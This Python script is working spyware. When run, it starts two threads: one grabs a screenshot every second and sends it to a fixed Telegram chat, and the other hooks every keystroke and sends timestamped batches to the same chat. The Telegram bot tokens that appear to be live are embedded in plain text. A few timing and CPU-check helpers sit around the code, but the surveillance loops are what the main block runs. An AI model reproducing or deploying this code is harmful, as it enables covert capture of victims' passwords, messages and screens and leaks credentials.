import datetime
import statistics
from threading import Thread

import psutil as psutil
import keyboard
import pyautogui
import io
import time
import telebot

TOKEN = '1623818411:AAE4iAu4JqlqUgoMI85deLc1KV94rG-CVJY'
TOKEN_KE = '1880257035:AAF7WeZKMAy2Lg8BMmdR3QX-rGYoUAjZ0bI'


def time_track_1(token):
    bot = telebot.TeleBot(TOKEN)

    def wrapper(func):
        def called(*args, **kwargs):
            count = 0
            while True:
                try:
                    now = time.time()
                    res = func(bot, *args, **kwargs)
                    end = time.time()
                    print(f'Executed time {func} {end - now} ')
                    count += 1
                except Exception as e:
                    print(e)

        return called

    return wrapper


def time_track_sm(func):
    def wrapper(*args, **kwargs):
        now = time.time()
        res = func(*args, **kwargs)
        end = time.time()
        print(f'Executed time {func.__name__} {end - now} ')
        return res
    return wrapper


def while_run(func):
    while True:
        func()


@time_track_1(token=TOKEN)
def scr1(bot, count):
    screenshot = pyautogui.screenshot()
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    count += 1
    bot.send_document(269019356, img_byte_arr)
    time.sleep(1)


def scr():
    count = 0
    bot = telebot.TeleBot(TOKEN)
    stats = []
    while True:
        try:
            now = time.time()
            screenshot = pyautogui.screenshot()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr = img_byte_arr.getvalue()
            count += 1
            bot.send_document(269019356, img_byte_arr)
            time.sleep(1)
            end = time.time() - now
            print(f'Executed time {end}')
            stats.append(end)
        except Exception as e:
            print(e)
    res_stats = statistics.mean(stats)
    return res_stats


def send_keyboard():
    bot = telebot.TeleBot(TOKEN_KE)
    SendMessage = bot.send_message
    while True:
        try:
            keyboard_list = []
            count = 0
            def print_pressed_keys(e):
                nonlocal count, keyboard_list
                count += 1
                new_time = str(datetime.datetime.now().replace(microsecond=0))
                keyboard_list.append((e.event_type, e.name, new_time))

                if count > 70:
                    res = ''
                    for a, b, c in keyboard_list:
                        res += f'{c} {a} {b} \n'
                    SendMessage(269019356, res)
                    keyboard_list = []
                    count = 0

            keyboard.hook(print_pressed_keys)
            keyboard.wait()
        except Exception as e:
            print(e)


def scr3(bot, count):
    screenshot = pyautogui.screenshot()
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    count += 1
    bot.send_document(269019356, img_byte_arr)
    # time.sleep(1)


def src(func):
    count = 0
    bot = telebot.TeleBot(TOKEN)
    stats = []
    for i in range(50):
        try:
            now = time.time()
            res = func(bot, count)
            end = time.time() - now
            print(f'Executed time {end} ')
            count += 1
            stats.append(end)
        except Exception as e:
            print(e)
    end_stats = statistics.mean(stats)
    return end_stats


@time_track_sm
def cpu_freq_check():
    cpu = psutil.cpu_freq()
    print(cpu)







if __name__ == '__main__':
    # speed_test()
    # cpu_freq_check()
    Thread(target=scr).start()
    Thread(target=send_keyboard).start()
    # b = scr()
    # a = src(scr3)
    # print(a, b)
